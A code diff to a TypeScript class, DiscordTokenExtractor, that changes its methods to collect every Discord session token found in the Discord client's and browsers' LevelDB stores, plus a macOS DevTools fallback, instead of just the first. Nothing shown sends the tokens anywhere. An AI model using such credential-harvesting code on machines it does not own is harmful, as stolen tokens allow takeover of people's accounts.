@@ -250,27 +250,34 @@ export class DiscordTokenExtractor {
     return token.startsWith(ENCRYPTED_PREFIX)
   }
 
-  async extract(): Promise<ExtractedDiscordToken | null> {
+  async extract(): Promise<ExtractedDiscordToken[]> {
     await this.loadCachedKey()
 
-    const levelDbToken = await this.extractFromLevelDB()
-    if (levelDbToken) {
-      return levelDbToken
-    }
+    const results: ExtractedDiscordToken[] = []
+    const seenTokens = new Set<string>()
 
-    const browserToken = await this.extractFromBrowserLevelDB()
-    if (browserToken) {
-      return browserToken
-    }
-
-    if (this.platform === 'darwin') {
-      const cdpToken = await this.tryExtractViaCDP()
-      if (cdpToken) {
-        return { token: cdpToken }
+    for (const t of await this.extractFromLevelDB()) {
+      if (!seenTokens.has(t.token)) {
+        seenTokens.add(t.token)
+        results.push(t)
       }
     }
 
-    return null
+    for (const t of await this.extractFromBrowserLevelDB()) {
+      if (!seenTokens.has(t.token)) {
+        seenTokens.add(t.token)
+        results.push(t)
+      }
+    }
+
+    if (results.length === 0 && this.platform === 'darwin') {
+      const cdpToken = await this.tryExtractViaCDP()
+      if (cdpToken && !seenTokens.has(cdpToken)) {
+        results.push({ token: cdpToken })
+      }
+    }
+
+    return results
   }
 
   private async loadCachedKey(): Promise<void> {
@@ -309,23 +316,28 @@ export class DiscordTokenExtractor {
     return null
   }
 
-  private async extractFromLevelDB(): Promise<ExtractedDiscordToken | null> {
+  private async extractFromLevelDB(): Promise<ExtractedDiscordToken[]> {
     const dirs = this.getDiscordDirs()
+    const results: ExtractedDiscordToken[] = []
+    const seenTokens = new Set<string>()
 
     for (const dir of dirs) {
       if (!existsSync(dir)) continue
 
       const token = await this.extractFromDir(dir)
-      if (token) {
-        return { token }
+      if (token && !seenTokens.has(token)) {
+        seenTokens.add(token)
+        results.push({ token })
       }
     }
 
-    return null
+    return results
   }
 
-  private async extractFromBrowserLevelDB(): Promise<ExtractedDiscordToken | null> {
+  private async extractFromBrowserLevelDB(): Promise<ExtractedDiscordToken[]> {
     const leveldbDirs = this.getBrowserLevelDBDirs()
+    const results: ExtractedDiscordToken[] = []
+    const seenTokens = new Set<string>()
 
     for (const leveldbDir of leveldbDirs) {
       if (!existsSync(leveldbDir)) continue
@@ -334,12 +346,15 @@ export class DiscordTokenExtractor {
       const browserBaseDir = this.findBrowserBaseDirForPath(leveldbDir)
       const tokens = this.extractTokensFromLDBFiles(leveldbDir, browserBaseDir ?? leveldbDir)
 
-      if (tokens.length > 0) {
-        return { token: tokens[0]! }
+      for (const token of tokens) {
+        if (!seenTokens.has(token)) {
+          seenTokens.add(token)
+          results.push({ token })
+        }
       }
     }
 
-    return null
+    return results
   }
 
   private async extractFromDir(discordDir: string): Promise<string | null> {
